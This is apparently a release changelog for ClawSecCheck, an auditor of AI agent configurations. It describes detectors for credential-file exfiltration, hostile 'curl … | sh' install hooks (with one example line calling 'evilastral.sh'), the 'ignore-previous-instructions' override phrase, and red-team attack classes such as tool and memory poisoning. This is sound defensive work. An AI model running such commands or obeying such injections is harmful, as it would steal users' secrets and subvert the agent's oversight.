  now traces an intra-file dataflow: a **credential FILE's** contents (`~/.ssh/id_*`,
  `.aws/credentials`, keychain, wallet, cookies DB, `.npmrc`/`.netrc`/`.docker/config`, …) reaching a
  **network sink** (`requests.post`, `urllib.urlopen`, `socket.send`, …). "Read a secret file → send
  it out" is malware-grade, so it routes through the existing B13 engine as **CRITICAL** in `--vet`
  and the default audit.
  - **FP-safe by construction:** sources are credential **files only — NOT environment variables**,
    so the ubiquitous legit pattern "read `OPENAI_API_KEY`, send it as an auth header" is never
    flagged. The taint pass is gated behind a cheap credential-path pre-filter and propagates across
    a few assignment steps (`p = path; k = open(p).read(); requests.post(url, data=k)`).
  - Parse-only (no execution); Python skill files only.

## [0.22.0] — 2026-06-20

### Added
- **B42 — skill/plugin install-time policy.** A supply-chain check for the install-time attack
  surface, scoped to NOT duplicate B25 (auto-update/pinning), B13 (skill content malware), or B22
  (writable identity + dangerous tools). It flags two genuinely new signals, read-only:
  - **Install/postinstall hooks that execute code** — a `package.json` `preinstall`/`postinstall`
    script whose command calls out or runs a shell (`curl … | sh`, `wget … | bash`, `node -e`,
    `base64`, `powershell`, a URL, …). These run on install **and on every auto-update**, unsandboxed,
    with the agent's permissions. Benign build hooks (`node build.js`) are not flagged.
  - **World-writable skill directories** — any other user on the box could drop a skill the agent
    loads. Only *world*-writable (`o+w`) is flagged; group-writable is skipped (benign on the common
    user-private-group / umask-002 setup) to keep zero false positives. POSIX-only; UNKNOWN on Windows.
  - MEDIUM, scored, **WARN-max (never FAIL)**; UNKNOWN when no skills are installed (mirrors B13, so
    grades on skill-less configs are unchanged).

## [0.21.1] — 2026-06-20

Quality checkpoint: an adversarial review of the 0.20.0 Host Watch and 0.21.0 Deeper-Vetting code
surfaced false-positive and robustness issues. All fixed here with regression tests. The detection
fixes are strictly narrowing, so they cannot introduce a false FAIL.

### Fixed
- **AST `GETATTR_INDIRECTION` false positive** — `getattr(obj, runtime_name)()` (ordinary dynamic
  dispatch) was flagged as malware-grade `crit`. Now `crit` only for a dangerous attribute literal or
  a dynamic attribute on a dangerous module (`os`/`subprocess`/…); ordinary dispatch is informational.
- **Injection-directive false positives** — dual-use prose ("do not notify the user on every sync",
  "never send your API key to a third party") raised a HIGH FAIL. Now the dual-use rules fire only
  alongside a real credential/exfil signal; only the canonical prompt-override directive
  fires on its own.
- **`skillast` "never raises" contract** — `_tainted_names` ran outside the parse try and
  `OverflowError` wasn't caught; wrapped. `_MAX_FINDINGS_PER_FILE` cap moved to the loop top.
- **`hostwatch` robustness** — `_alf_globalstate` now catches `struct.error` from a corrupt binary
  plist; macOS OpenBSM audit reports UNKNOWN (filesystem presence ≠ enabled on ≤13, deprecated on ≥14)
  instead of a false PASS.
- **Terminal-output sanitization** — `--vet-mcp` evidence and the `--vet` detail line are now
  `_sanitize`-d, mirroring the `--vet` evidence list (attacker-controlled MCP/skill strings no longer
  reach the terminal raw).
- Refreshed `docs/THREAT_COVERAGE.md` (now reflects B26/B31/B33/B41/B50–B54, RISK-10, AST/injection
  vetting) and logged the review findings in `docs/HARDENING_BACKLOG.md`.

## [0.21.0] — 2026-06-20

**Deeper skill vetting (AST + injection directives).** Inspired by a grounded comparison with
NVIDIA SkillSpector (Apache-2.0), `--vet` / B13 gained a static **Python AST** layer that catches
the obfuscation class pure regex misses — while keeping zero false-positive FAILs on real configs.

### Added
- **AST analysis of a skill's Python files** (`clawseccheck/skillast.py`, stdlib `ast`, **parse only
  — never compile/exec**). High-confidence (FAIL-eligible) detections: obfuscated `exec`/`eval` of a
  decoded string, `getattr(...)()` indirection to a dynamic/dangerous attribute, and
  `__import__("os").system(...)`-style dynamic-import execution. Informational sinks
  (`subprocess.*`, `os.system`, `pickle/marshal.loads`) escalate **only** alongside a credential/
  exfil signal — a skill that merely uses subprocess is never failed.
- **Injection-directive scan inside a vetted skill** (`_SKILL_INJECTION`): agent-manipulation prose
  (ignore-previous-instructions, exfiltrate-secrets, hide-from-user). HIGH; deliberately narrow so
  ordinary setup prose (reading a skill's own `.env`, curling a reputable installer) stays clean.
  Complements B6, which scans the user's *own* bootstrap.
- **Richer `--vet` output**: the verdict now prints the `file:line — reason` evidence list (it was
  previously suppressed in plain-text output).
- `docs/research/skillspector-comparison.md` — what was adopted from SkillSpector and what was
  **not** (YARA, live OSV.dev CVE, LLM semantic analysis — each excluded by our local-only / zero-
  network / stdlib-only laws), with attribution. No SkillSpector code was copied.

### Notes
- AST coverage is **Python-only**; JS/shell/other skill files remain on the regex engine.
- Taint/dataflow tracking is deferred to 0.22.0 (FP-delicate; needs conservative gating).
- Verified zero new false-positive FAILs across the real fleet configs; the AST layer runs in both
  `--vet` and the default-audit B13 (over installed skills).

## [0.20.0] — 2026-06-20

**Host Watch Posture** — ClawSecCheck now widens the lens by one ring: beyond the *agent's*
configuration, it asks whether the **host** the agent runs on is being watched at all. A powerful
agent on an unmonitored machine is a real exposure — if it were compromised, the activity could go
completely unseen.

### Added
- **Five host-monitor detection checks (B50–B54)**, all read-only and filesystem-only (no
  subprocess, no network): **B50** network monitoring / IDS (Suricata, Zeek, Snort, Little Snitch,
  Sysmon), **B51** host audit / syscall logging (auditd, OpenBSM, Sysmon), **B52** file-integrity
  monitoring (AIDE, Tripwire, osquery), **B53** endpoint protection / EDR (Wazuh, CrowdStrike,
  ClamAV, Microsoft Defender, Santa), **B54** host firewall (ufw, firewalld, nftables, macOS ALF,
  Windows Firewall). Cross-platform (Linux full; macOS / Windows best-effort); whatever cannot be
  determined read-only is reported **UNKNOWN**, never a fabricated positive.
- **RISK-10** capability path: *powerful agent on an unmonitored host*. Fires only on positive
  evidence that all four detection classes (IDS / audit / FIM / EDR) are absent **and** the agent is
  high-privilege (can exec/write **and** is reachable by untrusted input) — i.e. a breach would be
  invisible. Zero-false-positive: an inconclusive probe or any present monitor yields no chain.
- New module `clawseccheck/hostwatch.py` (the read-only detector, with injectable root/platform/PATH
  for hermetic testing) and `docs/research/host-monitor-signals.md` grounding every detection signal
  against authoritative docs (only HIGH-confidence signals are used as positives).
- New `--no-host` flag to skip host-monitor detection. Host scanning is **on by default** in the CLI
  (part of the default run, like the native audit); the audit engine keeps it off in hermetic mode.

### Design notes
- **Never FAIL.** B50–B54 are LOW severity and emit WARN only when the agent is high-privilege
  (otherwise PASS) — so the absence of host monitoring is flagged precisely when a compromise would
  matter, and it never hard-caps the grade. An agent that is sandboxed / low-reach is not nagged.
- **Active vs installed.** Where it can be read without running a command (ufw `ENABLED=yes`, a
  systemd `*.wants/` enable-symlink, the macOS ALF `globalstate`, the Windows `EnableFirewall`
  registry value) the report distinguishes *enabled* from merely *installed*.
- Determinism: in hermetic/test mode `ctx.host` is None → B50–B54 report UNKNOWN (excluded from the
  score), so existing grades are unchanged.

## [0.19.1] — 2026-06-20

### Fixed
- **RTL now actually works in the plain-text report** (`--lang he`). Previously the Hebrew text was
  translated but had no bidi formatting, so chat clients/terminals scrambled mixed Hebrew+English
  lines (field names, codes, numbers jumping sides). The text report now prefixes each line with an
  RLM (RTL base direction) and wraps every embedded LTR token (English field names, check codes,
  file paths, numbers) in a bidi **isolate**, so mixed lines render correctly. Applied only to our
  own final output **after** untrusted evidence has been bidi-stripped, and only safe isolate marks
  (no directional overrides) are used — so it doesn't weaken the anti-bidi-spoofing sanitizer.
  ASCII mode (`--ascii`) stays pure ASCII; the HTML report's `dir="rtl"` is unchanged.

## [0.19.0] — 2026-06-20

UX/transparency pass driven by real beta feedback (a user couldn't tell *why* the score was what
it was, didn't realise active tests are separate, and wanted automatic history).

### Added
- **"Why this score" breakdown** in the report: a line showing the weighted pass-rate over the
  scored checks (N pass / N warn / N fail, with a per-severity tally), so the grade is explainable
  at a glance instead of a bare number. UNKNOWN/advisory checks are stated as excluded.
- **Scope-clarity note** in the report: states plainly that the score reflects **configuration**,
  not live prompt-injection resistance or a deep MCP supply-chain vet, and points to
  `--canary`/`--redteam`/`--dryrun` (live injection) and `--vet-mcp` (deep MCP) for those.
- **Automatic local history**: every default audit now appends one entry to the private,
  owner-only `~/.clawseccheck/history.jsonl` so you can track your grade over time with `--trend`,
  with no extra flag. Opt out with the new **`--no-history`**. Still local — nothing is uploaded.

### Changed
- **SKILL.md guided playbook**: the agent now surfaces the open issues that lowered the grade (not
  just the single top one), states that the score is about configuration (and offers the live-injection
  + deep-MCP tests for what it doesn't cover), and mentions the local history.
- README "no writes by default" wording updated to reflect the opt-out auto-history (the only
  default write; owner-only, never uploaded).

## [0.18.0] — 2026-06-20

Phase 0.18.0, wave 1 — two new checks, both grounded on **real** OpenClaw config fields
(re-confirmed against docs.openclaw.ai + live fleet configs; no phantom paths).

### Added
- **B26 — Untrusted-context exposure** (`channels.<provider>.contextVisibility` /
  `channels.defaults.contextVisibility`). The OpenClaw default `"all"` lets the model see
  quoted/thread/history context from non-allowlisted senders in group chats — a prompt-injection
  surface. WARNs when any channel's effective value is `"all"`; PASS when all are
  `"allowlist"`/`"allowlist_quote"`; UNKNOWN with no channels. Hardening advisory (never FAIL).
  Complements the B21 bootstrap-policy check.
- **B33 — Known-vulnerable OpenClaw version gate** (`meta.lastTouchedVersion`). FAILs on a version
  in a known-advisory range — seeded with the one confirmed advisory **GHSA-g8p2-7wf7-98mq**
  (versions `<= 2026.1.28`, fixed `2026.1.29`: Control-UI `gatewayUrl` → gateway-token exfiltration;
  no CVE assigned). Unknown/unparseable versions are `UNKNOWN`, never `PASS`. The advisory table is
  maintained in-source and only asserts against the advisories it lists.
- **B41 — Credential blast-radius** (`auth.profiles.*`, `gateway.auth.token`). Inventories the
  credential surface reachable by the agent and WARNs when those credentials co-exist with untrusted
  ingress + outbound tools (one compromise's blast radius spans all of them). Reports only provider
  names + counts — **never** the account/email part of a profile key or any token value (PII-safe).
- **B31 — Effective-tools bypass** (`tools.deny`, `toolsBySender.<k>.deny`, `agents.list[].tools.toolsBySender`).
  Detects the documented OpenClaw footgun where `deny: ["write"]` does **not** deny `apply_patch`
  (or `exec`/`process`), so a believed-safe restriction still allows file mutation. WARNs unless the
  deny list uses `group:fs` or lists every mutating tool; UNKNOWN when no deny policy is configured.

### Changed
- **B4 (execution sandbox)** now specifically flags `agents.defaults.sandbox.docker.binds` mounting
  `docker.sock` (host-control / container-escape → FAIL) and `agents.defaults.sandbox.workspaceAccess="rw"`
  (agent can write the mounted workspace), in addition to the existing mode/network/binds checks.

### Notes
- Deferred (documented in `docs/THREAT_COVERAGE.md` / `HARDENING_BACKLOG.md`): B27 action-gate and
  B28 taint have **no** OpenClaw config surface and are already covered combinationally by the risk
  engine + B21/B8/B22, so they are intentionally not shipped as redundant scored checks. B36 egress
  stays unbuilt (the egress-allowlist fields are phantom). B29/B31/B41/B42 are later waves.

## [0.17.2] — 2026-06-20

Hardening pass from the v0.17.1 internal code review (all defense-in-depth — the tool is local
and read-only, none of these was remotely exploitable). +21 regression tests.

### Fixed
- **H1 — symlink directory escape** (`collector.py`): installed-skill collection followed a
  directory symlink under `skills/` (e.g. `evil -> /etc`) and read text outside the audit surface.
  Symlinked skill directories are now skipped.
- **H2 — secret leak into the report** (`checks.py`/B13): a hostile skill's base64/PowerShell-encoded
  payload could decode to a secret-shaped string and appear unredacted in the report. Decoded-payload
  previews are now run through `redact()`.
- **H3 — silent suppression of a score-capping finding** (`report.py`): suppressing a FAILed
  CRITICAL/HIGH (or a sensitive check B1/B2/B13/B20) via `.clawseccheckignore` dropped it from the
  report while uncapping the score — a one-line way to inflate the grade. Such suppressions are now
  always surfaced with their real severity.
- **H4 — swallowed native exit code** (`native.py`): a non-zero exit from `openclaw security audit`
  is now surfaced (exit code + stderr tail) instead of being reported as "ok".
- **H5 — IPv6 zone-id false positive** (`parse_bind_host`): a loopback/link-local bind with a zone
  id (`::1%eth0`, `[fe80::1%eth0]:port`) is no longer mis-flagged as publicly exposed.
- **H6 — per-skill file-count cap** (`collector.py`): scanning a skill with very many files is now
  bounded (file count, in addition to the existing byte caps).

## [0.17.1] — 2026-06-20

Docs only — README accuracy pass, no code change.

### Changed
- Dropped the "beta" framing from the README. 0.17.0 closed the four stable-release
  blockers, so the project is now positioned as stable; the section keeps the honest-limits
  and bug-reporting guidance, just without the beta label.

### Fixed (README accuracy)
- **Roadmap section** rewritten: it had listed an *already-shipped* v0.12 item as "planned".
  It now lists the genuinely unshipped work — the B26–B28 dirty-input taint chain, the B33
  OpenClaw CVE/version gate, and the B29/B31 reachability + effective-tools matrix.
- **Highest-risk paths**: corrected "eight chains (RISK-01 through RISK-08)" → nine; added the
  missing RISK-09 row (malicious installed skill → reachable data → egress → exfiltration).
- **Status**: corrected the stale "v0.15" → v0.17, RISK count, and added the v0.16 rename and
  the v0.17 stable-readiness hardening (real `tools.exec.mode` approval, IPv6 bind, all-channel
  sanitization, publish-pipeline hardening). Field names cited for B30/B32/B38/B39 verified
  against the real checks.

## [0.17.0] — 2026-06-20

Release-readiness pass: closes the four stable-release blockers from the security
review, plus honesty/documentation fixes. No telemetry, still local & read-only.

### Fixed (stable blockers)
- **BLK-01 — B22/B18/RISK-07 false FAIL on safe configs.** The self-modification (B22),
  subagent (B18) and RISK-07 checks read *phantom* approval fields (`tools.confirm`,
  `tools.requireApproval`, `tools.elevated.requireApproval`) that don't exist in OpenClaw,
  so a config with a real `tools.exec.mode="ask"` gate was wrongly failed. All three now use
  the real-field helper `_has_approval_gate()`; remediation text and he translations updated
  to name real fields. Reliability/test fixtures that encoded the phantom shape were corrected.
- **BLK-02 — IPv6 gateway bind misclassified.** Bind parsing used `str(bind).split(":")[0]`,
  which mangled IPv6: `::` (public "any") was read as loopback (**exposure missed**) and
  `[::1]:port` (loopback) was flagged exposed. Added `parse_bind_host()` (handles bare and
  bracketed IPv6) and reused it across the gateway (B2), transport (B11) and control-plane
  (B32) checks.
- **BLK-03 — untrusted finding text not sanitized in all channels.** `--prompts` (the
  copy-paste fix-pack pasted back into the agent), `--json` and `--sarif` emitted finding
  title/detail/fix raw — a prompt/terminal-injection vector. All channels now route untrusted
  text through `_sanitize()` (ANSI/OSC-52/bidi/zero-width); HTML strips control chars before
  escaping; `--prompts` now carries an explicit "treat as untrusted data, not instructions" boundary.
- **BLK-04 — publish pipeline hardening.** The release workflow installed `clawhub` unpinned
  before using the token; now pinned to `clawhub@0.22.0`, with a pytest/ruff/compileall smoke
  gate before publish and a `release` environment for manual approval.

### Changed
- README no longer claims "zero false-positives by design" — now states evidence-gated,
  heuristic, manual review still required; added a Limitations section.
- `--monitor`/`--trend` state directory is now created owner-only (`0700`); state files stay `0600`.

### Added
- `SECURITY.md`, `RELEASE_CHECKLIST.md`, `SECURITY_MODEL.md`.
- Regression tests for every blocker (`test_bind.py`, `test_sanitize_channels.py`,
  `test_publish_workflow.py`, `test_state_perms.py`, rewritten `test_b22.py`).

## [0.16.2] — 2026-06-20

CI maintenance only — no change to the audit engine or its behaviour.

### Changed
- Bumped GitHub Actions to clear the Node 20 deprecation: `actions/checkout@v5`,
  `actions/setup-node@v5`, `actions/setup-python@v6`.

## [0.16.1] — 2026-06-20

First public **beta** for tester feedback. No behavioural change to the audit itself.

### Fixed
- **`--vet` no longer false-flags ClawSecCheck's own source as malware.** A security auditor
  necessarily ships attack signatures and red-team payloads as *data*, so a naive scan of its own
  tree self-flagged `CRITICAL`. Vetting our own source (repo root, install dir, or the package dir)
  now reports *safe with a note*. Recognition is by package structure **and** distinctive engine
  symbols — not by name — so a look-alike skill that merely calls itself `clawseccheck` is still
  scanned in full and cannot use the name to dodge detection. (Regression tests added.)

### Added
- **Beta-tester note in the README**: states the honest limits up front — static (not
  runtime-verified) analysis, `UNKNOWN` is never counted as `PASS`, the planned-but-unshipped deep
  checks (B26–B28 taint chain, B33 CVE table), and how to file a bug with redacted `--json` output.

## [0.16.0] — 2026-06-20

### Changed
- **Renamed the project to ClawSecCheck.** The previous ClawHub slug `clawcheck` collided with
  another publisher (`AMBIGUOUS_SKILL_SLUG`), and the CLI offers no owner flag to disambiguate. The
  project is now **ClawSecCheck** everywhere — package `clawseccheck`, repo `gl0di/clawseccheck`,
  ClawHub slug `clawseccheck`, console script `clawseccheck`, state dir `~/.clawseccheck`, ignore
  file `.clawseccheckignore`. The slug is now unique, so `openclaw skills install clawseccheck` and
  `git:gl0di/clawseccheck` both install cleanly. GitHub auto-redirects the old repo URL, so existing
  `git:gl0di/clawcheck` references keep working. **No functional change** to any check, the engine,
  or the deterministic A–F score — this is a pure rename.

## [0.15.3] — 2026-06-20

### Fixed
- **Docs: scope the ClawHub slug.** (Historical — under the former `clawcheck` name.) The bare slug
  `clawcheck` was used by more than one ClawHub publisher, so `openclaw skills install/update clawcheck`
  failed with `AMBIGUOUS_SKILL_SLUG`. Superseded by the 0.16.0 rename to a unique slug.

## [0.15.2] — 2026-06-20

### Security / hygiene
- **Removed secret-shaped literals from the test suite.** The log-redaction tests
  (`tests/test_logsafe.py`) contained literal API-key-format strings (a Google `AIza…` key, an
  AWS `AKIA…` key, an Anthropic `sk-ant-…` key) used as inputs to verify `redact()` masks them.
  Secret scanners can't tell a test fixture from a real credential and flagged the Google one as a
  public leak. The values are now **assembled at runtime from parts**, so no contiguous secret
  literal exists anywhere in source — the tests still exercise the exact redaction patterns. None
  of these were real credentials; they were synthetic test inputs.

## [0.15.1] — 2026-06-20

### Added
- **Risk engine: malicious-skill exfiltration path (RISK-09).** When a check flags an installed
  skill as malicious (B13 FAIL) *and* the agent has an outbound egress surface (messaging channels
  or external-service skills), the risk engine now surfaces a **CRITICAL** chain — *malicious skill
  → full agent permissions → outbound egress → credential & data exfiltration* — so a real
  compromise shows up as an attack path, not only as an isolated finding. Found a real ClawHavoc
  skill (`googleworkspace`, base64 `curl|bash`) during a live run; this makes such cases legible.

### Fixed
- **ClawHub version.** Declared `version` in the SKILL.md frontmatter so ClawHub indexes the real
  release instead of defaulting to 0.1.0. (Bump this alongside `clawseccheck.__version__` each release.)

## [0.15.0] — 2026-06-19

### Added
- **B30 — Sender identity strength.** Reads `channels.<provider>.dangerouslyAllowNameMatching`
  and `channels.telegram.includeGroupHistoryContext`; FAILs when allowlists are keyed on the
  mutable display name (trivially bypassed by renaming), WARNs when recent group history is
  injected into model context as untrusted input.
- **B32 — Control-plane mutation reachability.** Reads `gateway.tools.allow` and
  `gateway.tools.deny`; FAILs when a control-plane tool (`cron`, `config.apply`, `update.run`,
  `sessions_spawn`, `sessions_send`, `gateway`) is explicitly re-enabled over the HTTP gateway,
  WARNs when the gateway is network-exposed and control-plane tools are not explicitly denied.
- **B38 — Browser / SSRF exposure.** Reads `browser.ssrfPolicy.dangerouslyAllowPrivateNetwork`,
  `browser.noSandbox`, and `browser.ssrfPolicy.hostnameAllowlist`; FAILs when the agent browser
  can reach private/internal IPs (cloud-metadata credential theft) or runs without OS sandbox,
  WARNs when no hostname allowlist restricts browser egress.
- **B39 — Session visibility / cross-user transcript leak.** Reads `session.dmScope` and
  `tools.sessions.visibility`; FAILs when `dmScope="main"` shares one session across all DM
  peers in a multi-sender channel (cross-user transcript contamination), WARNs when
  `tools.sessions.visibility` is `"agent"` or `"all"` (cross-session transcript reads).
- **Risk engine — highest-risk capability chains (`--risk-paths`).** Combinational analysis that
  detects dangerous chains of co-occurring properties: untrusted sender + exec tool (RISK-01),
  Lethal Trifecta: dirty input + secrets + outbound (RISK-02), no sandbox + untrusted ingress +
  exec (RISK-03), mutable agent identity + elevated tools (RISK-04), browser SSRF + secrets
  reachable (RISK-05), control-plane reachable from open surface (RISK-06), writable
  bootstrap/identity + exec without approval gate (RISK-07), session shared across users in
  multi-user channel (RISK-08). Each chain fires only on positive evidence for every link
  (zero false-positives by design). Surfaced in the default report, in `--json` as `"risk_paths"`,
  and as a standalone section via `--risk-paths`. Does not affect the deterministic A–F score.
  All checks grounded on the real OpenClaw schema; local and read-only.

## [0.14.0] — 2026-06-19

### Added
- **`--vet-mcp` — MCP supply-chain vetting (the #1 market gap).** Vets every connected MCP
  server listed under `mcp.servers.*` for supply-chain risk *before* you trust it. Flags:
  unpinned install sources (`npx @scope/pkg` without a pinned version, `@latest` references,
  `curl | sh` bootstrap), plaintext-HTTP remote transports (non-TLS `streamable-http` or `sse`
  URLs), environment-variable secret passthrough (env keys that look like credentials), and
  overly broad OAuth scopes. Each server receives a verdict of **SAFE**, **SUSPICIOUS**, or
  **DANGEROUS**. Entirely local and read-only — no network calls, no writes, no config changes.
  Grounded against the confirmed OpenClaw MCP schema
  (`mcp.servers.<name>.{command, args, env, transport, url, oauth.scope}`).
- **Expanded agentic red-team attack classes (`--redteam`).** Six new attack categories added to
  the red-team suite, each with two scenario variants:
  - `tool_poisoning` (TP-01, TP-02) — malicious tool descriptions that redirect agent behavior.
  - `mcp_response_injection` (MR-01, MR-02) — injections embedded in MCP server responses.
  - `memory_poisoning` (MP-01, MP-02) — hostile instructions written into the agent's memory store.
  - `multi_agent` (MA-01, MA-02) — cross-agent instruction smuggling via subagent messages.
  - `approval_bypass_via_injection` (AB-01, AB-02) — injections that claim pre-approval or try to
    suppress confirmation prompts.
  - `dirty_to_exfil` (DE-01, DE-02) — multi-hop dirty-input-to-exfiltration chains.
  All scenarios carry a `criterion` field describing the concrete pass/fail signal; `render_suite`
  emits a `CRITERION:` line per entry for easy human review.
- **Expanded dry-run sources (`--dryrun`).** Three new untrusted-input sources added to the
  behavioral dry-run harness: `mcp_response` (DR-06, DR-07), `memory_store` (DR-08, DR-09), and
  `subagent` (DR-10, DR-11). The evaluator correctly classifies VULNERABLE/RESISTANT for each.
- **+95 tests.** New test coverage for all added attack classes, criterion fields, new dry-run
  sources, and evaluator correctness. Full suite: 924 tests, 100% pass.

## [0.13.1] — 2026-06-19

### Fixed
- **B6 false positive (CRITICAL) on well-configured agents.** B6's bootstrap scan used a
  context-blind `without (asking|confirmation)` pattern that flagged *protective* directives —
  e.g. "Don't run destructive commands without asking" — as injection-prone, producing a false
  CRITICAL FAIL on real configs. Removed that pattern; B6 now flags only blanket-obedience /
  injection-override directives. Approval-bypass phrasing remains covered by **B23** (which is
  severity-gated and correctly scoped). Verified against live fleet bootstrap files.
- **B5 no longer falsely reassures.** Plugin/skill pinning & integrity are not recorded in
  `openclaw.json` (per-manifest metadata), so B5 returned a misleading "looks safe" PASS. It now
  returns **UNKNOWN** when plugins are installed, pointing to the checks that actually assess
  supply chain: B13 (content scan), B24 (MCP pinning), B25 (update pinning).

## [0.13.0] — 2026-06-19

### Fixed

- **Schema-correctness — several checks read field paths that did not exist in the real OpenClaw
  schema and silently never fired; now grounded against docs.openclaw.ai.** Corrected paths:
  - `gateway.password` → `gateway.auth.password`
  - `sandbox.*` → `agents.defaults.sandbox.*`
  - `tailscale.funnel` → `tailscale.mode == "funnel"`
  - `mcp` → `mcp.servers`
  - `heartbeat` → `agents.defaults.heartbeat`
  - `gateway.tls.enabled` (field confirmed present; check now reads it correctly)
  - `tools.elevated.allowFrom` is a provider-keyed dict, not a flat list; check updated accordingly
  - B10 audit-log check returns `UNKNOWN` when no audit config exists (audit is a CLI command, not
    a config toggle) instead of a perpetual false WARN that dinged every config's score
  - Removed dead phantom branches that could never be reached with real config shapes
- The reliability FP/FN corpus fixtures now use real schema shapes drawn from live fleet configs,
  so regression tests exercise the paths that actually fire on real installations.

This materially improves true-positive coverage on real OpenClaw configs.

## [0.12.0] — 2026-06-19

### Added
- **Full Hebrew finding detail.** The dynamic "why"/detail text (evidence with interpolated
  config values) is now translated in the Hebrew report via render-time fragment-splitting +
  regex rules; config keys, paths, hostnames and values are preserved. This completes the
  bilingual work begun in v0.9 (which translated only static strings). English output is
  unchanged (the translation layer is a no-op for en).

## [0.11.0] — 2026-06-19

### Added
- **Guided mode — "What you can do next" recommendation block.** After every default audit run,
  ClawSecCheck now prints a short, prioritised list of next steps tailored to your actual findings —
  pointing you to the right tool without requiring you to know any flags. The same list is
  available in `--json` as a `"next_actions"` array (id, title, command, why, priority) and as a
  standalone output via `--next`. The engine (`clawseccheck/guide.py`) drives seven recommendation
  triggers: fix prompts for open FAIL findings, skill vetting when third-party skills are
  installed, monitoring setup when B16 is unresolved, live injection test, MCP review, trend
  tracking, and grade sharing. Non-technical users running the skill inside OpenClaw can now
  reach every tool through the agent's natural-language menu — they never need to know a flag.
- **Rewritten SKILL.md conversational playbook.** The agent-facing playbook was replaced with a
  guided, step-by-step flow: first-run orientation, plain-language explanation of Score / Grade /
  Lethal Trifecta, a short numbered next-steps menu drawn from `--next`, and per-choice
  sub-sections covering every tool (`--prompts`, `--vet`, `--monitor`, `--canary`/`--dryrun`/
  `--redteam`, `--trend`, `--percentile`, `--badge`/`--card`). A natural-language-to-tool lookup
  table and an explicit boundary section ("what ClawSecCheck will NOT do") are included.

**ClawSecCheck still only CHECKS and GUIDES — it does NOT apply fixes or change your config.**
For every open finding, `--prompts` shows a ready copy-paste prompt you hand to your agent or
apply yourself; ClawSecCheck never touches your OpenClaw configuration. Everything stays local: no
network calls, no telemetry, no write unless you ask. English report/card output for the four
core renderers (`render_report`, `render_card`, `render_monitor`, `render_prompts`) is
byte-identical to v0.10.0.

## [0.10.0] — 2026-06-19

### Added
- **`--sarif PATH` — local SARIF 2.1.0 output.** Writes a SARIF file to the path you
  specify; compatible with GitHub Code Scanning's "Upload SARIF" step. The file is written
  locally and never uploaded — ClawSecCheck makes no network calls.
- **`--fail-under N` / `--exit-code` — CI gating.** `--fail-under N` exits 1 when the
  audit score is below N; `--exit-code` exits 1 when any unsuppressed FAIL finding is
  present. Without these flags the exit code stays 0 (backward-compatible).
- **`--verbose` / `--debug` / `--log PATH` — local logging with secret redaction.**
  Structured stdlib `logging` to stderr (INFO or DEBUG level) and optionally to a file.
  Config values that may contain secrets are redacted before being written to any log,
  practising ClawSecCheck's own B9/B10 checks.
- **`--trend` / `--history PATH` — local score history.** Records each audit result to an
  append-only JSONL file (default `~/.clawseccheck/history.jsonl`, `chmod 600`) and prints a
  compact trend table with per-run arrows. History is stored only on your machine.
- **`--percentile` — offline reference percentile.** Shows where your score sits relative
  to a bundled static reference profile. Entirely offline — no comparison over the network,
  no telemetry.
- **Expanded Hebrew translations (detail + fix).** Static detail and fix strings for all
  checks (A1, B1–B25, C3–C5) are now translated in the Hebrew report. Dynamic strings
  containing interpolated config values fall back to English.
- **Reliability FP/FN corpus.** A false-positive / false-negative fixture set guards all
  checks against regressions, supplementing the existing unit tests.

**Everything stays local. No network calls, no telemetry, no phone-home — ever.**
All history, SARIF files, and logs are written only on your machine, only when you ask.

## [0.9.0] — 2026-06-19

### Added
- **Bilingual output (`--lang en|he`).** Hebrew report chrome (headings, labels, section titles),
  all check titles translated to Hebrew, and a right-to-left HTML report (`<html dir="rtl">`,
  `lang="he"`, `body{text-align:right}`) when `--lang he` is passed. Auto-detects Hebrew from the
  `LANG`/`LC_ALL` locale so users in a Hebrew locale get it without any extra flag. Finding
  "why"/detail text stays English in this version — full detail translation is planned. English
  output is byte-identical to v0.8.0; the `--lang en` default changes nothing.

## [0.8.0] — 2026-06-19

### Added
- **Runtime dry-run harness (`--dryrun`).** The behavioral test: emits scenarios of untrusted
  input (email/web/MCP/memory) carrying a *fake* secret + fake tools, and an evaluator that flags
  the agent VULNERABLE if it would call a dangerous tool with that secret. Beyond "is it
  configured" → "does it actually obey an injection". (Deterministic scaffold; live run is agent-driven.)
- **B25 — Update / pinning hygiene.** Flags blind skill auto-update and unpinned install sources
  (a malicious update runs with the agent's full permissions).
- **C5 — Native-binary PATH safety.** Flags a world-writable `openclaw` binary dir or a writable
  PATH dir that could shadow it (poisoned-PATH protection for the native audit). POSIX, advisory.
- **`--verify-self`.** Prints a SHA-256 digest of ClawSecCheck's own engine source so you can confirm
  it wasn't tampered with against a trusted release.

### Security
- **`.clawseccheckignore` governance.** The report warns when a CRITICAL finding (or a critical check
  id B1/B2/B13/B20) is suppressed, and `--monitor` alerts when the ignore file changes — so a
  suppression can't quietly hide a real hole.

## [0.7.0] — 2026-06-19

### Added (agent-behavior checks, from the external review)
- **B20 — Bootstrap/memory write protection.** Flags group/world-writable `SOUL.md`/`AGENTS.md`/
  `TOOLS.md` (or their parent dirs) — anyone who can rewrite them owns the agent's identity. POSIX.
- **B21 — Tool-output trust boundary.** Whether the bootstrap tells the agent that tool output /
  web / email / MCP responses are *data, not instructions*.
- **B22 — Self-modification risk.** Flags when the agent can rewrite its own identity/skills/config
  (write access + exec/fs_write) without human approval.
- **B23 — Approval-bypass directives.** Catches bootstrap language that weakens approval
  ("do not ask confirmation", "assume approved", "auto-approve", …).
- **B24 — MCP server hardening.** Deepens B15: flags `npx@latest`/unpinned stdio MCP, `env: "*"`
  / broad-secret passthrough, token passthrough, and SSRF/metadata-IP reach.
- **Expanded B13 signatures.** URL-safe base64, PowerShell `-EncodedCommand` (UTF-16LE),
  Discord/Telegram webhook exfil, more credential paths, and a same-skill credential+exfil rule.

## [0.6.0] — 2026-06-19

### Added
- **Live red-team suite (`--redteam`).** A library of benign adversarial payloads
  (prompt-injection, jailbreak, system-prompt-leak, tool-abuse, indirect-injection) to feed the
  agent and check whether it obeys — the multi-scenario successor to `--canary`.
- **HTML report (`--html PATH`).** A standalone, self-contained styled report (owner view;
  HTML-escaped; marked private).

### Security (hardening from an external review)
- **Allowlist suffix bypass fixed.** `curl https://evilastral.sh/... | sh` is no longer treated
  as the reputable `astral.sh` — only exact host or real subdomain matches now (B13).
- **Symlink escape blocked.** The installed-skill reader skips symlinks and refuses any path that
  resolves outside the skill directory, so a skill can't make the auditor read other files.
- **Report output is sanitised.** Findings/skill-names/payload previews (untrusted data) are
  stripped of ANSI/OSC (incl. OSC-52 clipboard), bidi-override and zero-width characters.
- **Random canary token** by default (was deterministic), so an agent can't be pre-trained on it.
- **Monitor state** is written `chmod 600`.
